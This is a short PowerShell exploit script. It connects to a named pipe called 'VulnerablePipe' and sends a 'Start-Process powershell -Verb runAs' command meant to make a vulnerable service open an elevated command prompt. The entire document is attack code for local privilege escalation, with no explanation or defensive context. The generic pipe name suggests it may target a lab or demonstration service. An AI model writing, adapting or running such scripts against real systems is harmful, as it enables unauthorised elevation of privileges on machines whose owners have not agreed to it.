# Exploit script to connect to the vulnerable named pipe and send a command to launch an elevated privilege command prompt
$pipeName = "\\.\pipe\VulnerablePipe"

# Connect to the named pipe
$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(".", "VulnerablePipe", [System.IO.Pipes.PipeDirection]::Out)
Write-Host "Connecting to named pipe..."
try {
    $pipeClient.Connect()
    Write-Host "Connected to named pipe."

    $streamWriter = New-Object System.IO.StreamWriter($pipeClient)
    $streamWriter.AutoFlush = $true

    # Send a command to launch an elevated privilege command prompt
    $command = "Start-Process powershell -Verb runAs"
    Write-Host "Sending command: $command"
    $streamWriter.WriteLine($command)
    $streamWriter.Flush()

    $streamWriter.Close()
    $pipeClient.Close()
    Write-Host "Command sent and pipe closed."
} catch {
    Write-Host "Error connecting to named pipe: $_"
}
